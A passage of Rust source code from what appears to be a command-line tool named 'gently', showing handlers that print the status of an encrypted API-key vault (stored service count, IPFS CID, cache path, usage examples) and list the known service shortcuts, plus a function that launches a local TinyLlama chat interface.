        VaultCommands::Status => {
            println!("\n  VAULT STATUS");
            println!("  ============\n");

            let vault = get_vault();
            let services = vault.list();

            println!("  Services stored: {}", services.len());

            if let Some(cid) = vault.cid() {
                println!("  IPFS CID:        {}", cid);
            } else {
                println!("  IPFS CID:        (not saved yet)");
            }

            println!();
            println!("  Local cache: ~/.local/share/gently/vault.enc");
            println!();
            println!("  Usage:");
            println!("    gently vault set anthropic sk-ant-...");
            println!("    gently vault get anthropic --export");
            println!("    gently vault save");
            Ok(())
        }

        VaultCommands::Services => {
            println!("\n  KNOWN SERVICES");
            println!("  ==============\n");

            for (service, env_var) in ServiceConfig::known_services() {
                println!("    {:12} -> {}", service, env_var);
            }

            println!();
            println!("  You can use any service name; these are just shortcuts.");
            println!("  Custom names will use <SERVICE>_API_KEY as env var.");
            Ok(())
        }
    }
}


/// Run the local chat TUI with TinyLlama
fn run_local_chat() -> Result<()> {
    chat::run_chat().map_err(|e| anyhow::anyhow!("Chat TUI error: {}", e))
}
